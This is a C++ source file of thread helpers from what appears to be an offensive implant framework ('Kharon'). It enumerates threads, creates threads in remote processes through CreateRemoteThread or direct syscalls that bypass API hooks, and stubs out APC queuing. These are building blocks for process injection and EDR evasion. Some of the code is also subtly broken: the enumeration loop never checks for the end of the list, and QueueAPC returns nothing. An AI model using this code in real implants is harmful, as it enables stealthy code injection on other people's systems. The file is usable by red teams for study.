#include <Kharon.h>

auto DECLFN Thread::Enum(
    _In_      INT8  Type,
    _In_opt_  ULONG ProcessID,
    _In_opt_  ULONG Flags,
    _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
) -> ULONG {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
    PVOID                       ValToFree     = NULL;
    ULONG                       bkErrorCode   =  0;
    ULONG                       ReturnLen     = 0;
    ULONG                       RandomNumber  = 0;
    ULONG                       ThreadID      = 0;
    BOOL                        bkSuccess     = FALSE;

    Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( ReturnLen );
    ValToFree   = SysProcInfo;

    bkErrorCode = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
    if ( bkErrorCode ) goto _KH_END;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

    while( 1 ) {
        if ( SysProcInfo->UniqueProcessId == UlongToHandle( Self->Session.ProcessID ) ) {
            SysThreadInfo = SysProcInfo->Threads;

            for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                if ( Type == TdRandom ) {
                    if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
                        ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
                    }
                }
            }
        }

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

_KH_END:
    if ( SysProcInfo ) Self->Hp->Free( ValToFree );

    return ThreadID;
}

auto DECLFN Thread::Create(
    _In_  HANDLE ProcessHandle,
    _In_  PVOID  StartAddress,
    _In_  PVOID  Parameter,
    _In_  ULONG  StackSize,
    _In_  ULONG  Flags,
    _Out_ PULONG ThreadID
) -> HANDLE {
    HANDLE Handle = INVALID_HANDLE_VALUE;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;

        if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) ProcessHandle = NtCurrentProcess();

        SyscallExec( syCrThread, Status, &Handle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL );
        Self->Usf->NtStatusToError( Status );
    } else {
        if ( ProcessHandle ) {
            Handle = Self->Krnl32.CreateRemoteThread( ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
        } else {
            Handle = Self->Krnl32.CreateThread( 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
        }
    }

    return Handle;
}

auto DECLFN Thread::Open(
    _In_ ULONG RightAccess,
    _In_ BOOL  Inherit,
    _In_ ULONG ThreadID
) -> HANDLE {
    return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
}

auto DECLFN Thread::QueueAPC(
    _In_     PVOID  CallbackFnc,
    _In_     HANDLE ThreadHandle,
    _In_opt_ PVOID  Argument1,
    _In_opt_ PVOID  Argument2,
    _In_opt_ PVOID  Argument3
) -> LONG {
    // return Self->Ntdll.NtQueueApcThread( ThreadHandle, static_cast<PPS_APC_ROUTINE>(CallbackFnc), Argument1, Argument2, Argument3 );
}